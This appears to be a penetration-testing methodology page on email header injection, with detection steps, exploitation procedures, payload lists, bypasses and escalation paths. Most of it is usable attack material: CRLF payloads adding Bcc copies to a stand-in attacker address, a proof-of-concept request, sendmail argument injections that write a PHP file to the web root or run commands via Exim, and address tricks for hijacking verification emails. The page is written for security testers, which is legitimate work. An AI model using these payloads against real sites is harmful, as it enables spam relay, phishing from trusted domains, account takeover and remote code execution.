# Email Injection

> **Summary**: Injection of arbitrary email headers or body content through unsanitized user input in web application mail-sending functionality.
> **Impact**: Spam relay, phishing from trusted domains, data exfiltration, account takeover via verification email manipulation, and in some cases remote code execution via sendmail parameters.
> **Typical Severity**: Medium | High (when RCE via sendmail is possible)

---

## Detection

### Indicators
- Web forms that send emails (contact forms, password reset, invite features, newsletter subscription)
- User-controlled input reflected in email headers (`From`, `To`, `Subject`, `CC`, `BCC`)
- Applications using PHP `mail()` function or direct SMTP commands
- Email bodies constructed from user-supplied templates

### Automated Detection
```bash
# Test for CRLF injection in email parameters with Burp Suite
# Inject %0ACc:attacker@evil.com in every parameter that ends up in an email

# Use ffuf to fuzz email header injection points
ffuf -u "https://<TARGET>/contact?email=test%40test.comFUZZ" \
  -w /usr/share/seclists/Fuzzing/CRLF-injection.txt \
  -mc all -fr "invalid"
```

### Manual Detection
1. Identify any form or API endpoint that triggers an email (contact, feedback, invite, share, password reset)
2. Inject CRLF characters (`%0A`, `%0D%0A`, `%0D`) followed by additional headers (`Cc:`, `Bcc:`, `To:`, `Subject:`)
3. Check if the injected headers appear in the received email
4. Test the email body by injecting two newlines (`%0A%0A`) followed by arbitrary content
5. If the application uses PHP `mail()`, test the 5th parameter for sendmail argument injection

---

## Exploitation

### Prerequisites
- A web form or API that sends email based on user-supplied input
- Insufficient sanitization of newline characters (`\r`, `\n`) in email header fields
- For sendmail exploitation: user input reaching the `$additional_parameters` argument of PHP `mail()`

### Step-by-Step

1. **Identify injection point** -- Submit a form and intercept the request; look for parameters that map to email fields (sender, recipient, subject, body)
   - Success: parameter values appear in the email headers or body
2. **Test for header injection** -- Append `%0ACc:attacker@evil.com` to a parameter value
   - Success: attacker receives a copy of the email
3. **Inject BCC for stealth** -- Use `%0ABcc:attacker@evil.com` to receive a blind copy
   - Success: email arrives at attacker address without visible trace
4. **Override subject** -- Inject `%0ASubject:Phishing%20Subject`
   - Success: email subject is changed or a second Subject header is added
5. **Modify body** -- Inject `%0A%0AAttacker-controlled body content` to override the message body
   - Success: recipients see attacker-controlled content in the email body
6. **Sendmail parameter injection (PHP)** -- If `mail()` 5th param is reachable, inject `-X/var/www/html/shell.php` to log output to a web-accessible file
   - Success: PHP file is written to the web root

### Payloads

#### Header Injection (CC/BCC)
```
# Inject CC
sender@domain.com%0ACc:attacker@evil.com

# Inject BCC
sender@domain.com%0ABcc:attacker@evil.com

# Inject additional To
sender@domain.com%0ATo:attacker@evil.com

# Override Subject
sender@domain.com%0ASubject:Password%20Reset%20Required

# Full body override
sender@domain.com%0A%0AThis%20is%20a%20phishing%20message.%0AClick%20here:%20http://evil.com
```

#### PHP mail() 5th Parameter (Sendmail Argument Injection)
```bash
# Write email log to web-accessible file
-X/var/www/html/rce.php

# Specify additional config file (Sendmail MTA)
-C/tmp/evil.cf

# Specify alternative queue directory (Postfix)
-qR

# Read body from file (Exim)
-be ${run{/bin/id}}
```

#### Email Address Tricks for Verification Bypass
```
# Sub-addressing (plus tagging) -- ignored by most servers
victim+attacker@domain.com

# Comments in parentheses
victim(attacker)@domain.com

# IP-based domain
user@[127.0.0.1]
user@[IPv6:2001:db8::1]

# Encoded email atoms (RFC 2047 encoding)
=?utf-8?q?=61=62=63?=@example.com

# Null byte truncation in verification flows
=?x?q?attacker=40evil.com=3e=00?=victim@example.com
```

### Proof of Concept
```http
POST /contact HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

name=Test&email=legitimate@test.com%0ABcc:attacker@evil.com&message=Hello
```

Expected result: `attacker@evil.com` receives a blind copy of the contact form email sent by the application.

---

## Bypasses

- **Double encoding**: `%250A` if the application decodes twice
- **Unicode newlines**: `\u2028` (Line Separator), `\u2029` (Paragraph Separator)
- **Mixed CRLF sequences**: `%0D%0A`, `%0D`, `%0A` -- try all variants as servers parse differently
- **Header folding**: use `%0A%20` or `%0A%09` (newline followed by space/tab) to continue a header
- **Null bytes**: `%00` after injected header to truncate further processing
- **Encoded email atoms**: Use RFC 2047 encoding (`=?charset?encoding?data?=`) to smuggle characters past validation as described in PortSwigger research on email splitting

---

## Escalation

- **Phishing at scale**: Inject BCC with hundreds of addresses to use the trusted server as a spam relay
- **Account takeover via verification email hijack**: Manipulate email address encoding to redirect verification/password-reset emails to attacker-controlled addresses
- **RCE via sendmail**: Exploit PHP `mail()` 5th parameter to write files, read configuration, or execute commands depending on the MTA (Sendmail, Postfix, Exim)
- **SPF/DKIM/DMARC pass**: Emails sent through the application's legitimate mail server will pass authentication checks, making phishing highly effective
- **Internal network probing**: If the mail server is internal, injection can be used to probe internal services
- **Chain with [SSTI](ssti.md)**: If email templates use a templating engine, inject template expressions in the body for server-side template injection
- **Chain with [CRLF](crlf.md)**: Email header injection is a specific case of CRLF injection

---

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Intercept and modify email-related parameters, test CRLF injection |
| [Swaks](https://github.com/jetmore/swaks) | `swaks --to victim@target.com --from attacker@evil.com --header "X-Test: injected"` -- Swiss Army Knife for SMTP testing |
| ffuf | Fuzz email parameters with CRLF payloads |
| [PHPMailer Exploit](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) | Reference for PHP mail() sendmail parameter injection |
| Burp Turbo Intruder | Fuzz encoded email atom combinations for verification bypass |
| [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) | Burp extension for email splitting attack encoding |

---

## References

- [HackTricks - Email Injections](https://book.hacktricks.wiki/pentesting-web/email-injections.html)
- [Pwning PHP mail() for Fun and RCE](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [PortSwigger Research - Splitting the Email Atom](https://portswigger.net/research/splitting-the-email-atom)
- [InfoSec Institute - Email Injection](https://resources.infosecinstitute.com/email-injection/)
- Related: [CRLF Injection](crlf.md), [SSTI](ssti.md), [Command Injection](command-injection.md)
